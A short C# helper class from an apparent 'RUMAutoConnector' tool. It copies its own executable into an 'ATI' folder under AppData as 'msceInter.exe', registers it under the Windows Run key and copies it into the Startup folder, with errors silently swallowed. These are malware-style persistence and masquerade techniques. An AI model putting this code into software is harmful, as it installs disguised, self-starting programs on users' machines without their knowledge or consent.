using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace RUMAutoConnector
{
    public class Helper
    {
        public static void AddToRegistry()
        {
            try
            {
                System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ATI\" + "msceInter.exe");
                RegistryKey RegStartUp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RegStartUp.SetValue("msceInter", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ATI\" + "msceInter.exe");
            }
            catch { }
        }

        public static void AddToStartup()
        {
            try
            {
                System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "msceInter.exe");
            }
            catch { }
        }
    }
}
